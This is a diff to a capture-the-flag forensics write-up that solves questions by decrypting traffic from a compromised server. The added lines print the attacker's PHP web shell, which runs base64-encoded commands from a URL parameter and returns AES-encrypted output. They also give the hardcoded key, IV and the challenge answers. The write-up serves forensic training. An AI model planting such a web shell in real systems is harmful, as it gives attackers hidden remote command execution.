@@ -116,8 +116,14 @@ Hello, In this writeup, I will discuss solutions for 3 challenges that I success
 ![After Decrypt](./assets/img/2025-12-22-university-ctf-2025/forensic-8.png)
 
 **Key Code Line:**
-```php
-$a54vag = shell_exec($A4gVaXzY);  // ← This stores command output
+```<?php 
+$A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G"; // ← Key AES
+$A4gVaRmV = "pZ7qR1tLw8Df3XbK"; // ← IV AES
+$A4gVaXzY = base64_decode($_GET["q"]);
+$a54vag = shell_exec($A4gVaXzY); // ← This stores command output
+$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV); // ← AES encryption usage
+echo base64_encode($A4gVaQdF); 
+?>
 ```
 
 **Answer:** `$a54vag`
@@ -127,33 +133,44 @@ $a54vag = shell_exec($A4gVaXzY);  // ← This stores command output
 **Approach:** Find encrypted hostname output, then decrypt using AES-256-CBC.
 
 **Steps:**
-1. Search for packet with `hostname` command execution (in the q parameter of the third file mentioned earlier)
+1. Search for packet with `hostname` command execution (in the q parameter of the third file mentioned earlier, find the one that when decrypted produces 'hostname')
 2. Find encrypted response in packet details
 3. Use CyberChef with:
    - **Algorithm:** AES Decrypt
    - **Key:** `kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G`
    - **IV:** `pZ7qR1tLw8Df3XbK`
-   - **Input format:** <encrypted_response>
-   - **Output format:** <hosename>
+   - **Input format:** HYjF7a38Od/H2Qc+uaBKuA==
+   - **Output format:** tinselmon01
 
 (Key & IV derived from the AES encryption evidence found earlier)
+
+![Image](./assets/img/2025-12-22-university-ctf-2025/forensic-9.png)
+![Image](./assets/img/2025-12-22-university-ctf-2025/forensic-10.png)
+![Image](./assets/img/2025-12-22-university-ctf-2025/forensic-11.png)
+![Image](./assets/img/2025-12-22-university-ctf-2025/forensic-12.png)
 
 **Answer:** `tinselmon01`
 
 ##### 7. Database Password
 
-**Approach:** Find encrypted database config file output, then decrypt it.
+**Approach:** Find encrypted database config file output, then decrypt it. (The steps are the same as question 6)
 
 **Steps:**
 1. Search for packet with `cat include/config.php` command
 2. Extract encrypted response
 3. Decrypt using same AES-256-CBC key and IV as Question 6
-4. Parse the config file to find `password` field
+4. Use CyberChef:
+   - **Algorithm:** AES Decrypt
+   - **Key:** `kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G`
+   - **IV:** `pZ7qR1tLw8Df3XbK`
+   - **Input format:** (encrypted text)
+   - **Output format:** (database configuration)
+5. Parse the config file to find `password` field
 
-**Decryption Details:**
-- **Key:** `kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G`
-- **IV:** `pZ7qR1tLw8Df3XbK`
-- **Algorithm:** AES-256-CBC
+![Image](./assets/img/2025-12-22-university-ctf-2025/forensic-13.png)
+![Image](./assets/img/2025-12-22-university-ctf-2025/forensic-14.png)
+![Image](./assets/img/2025-12-22-university-ctf-2025/forensic-15.png)
+![Image](./assets/img/2025-12-22-university-ctf-2025/forensic-16.png)
 
 **Answer:** `zqvyh2fLgyhZp9KV`
 
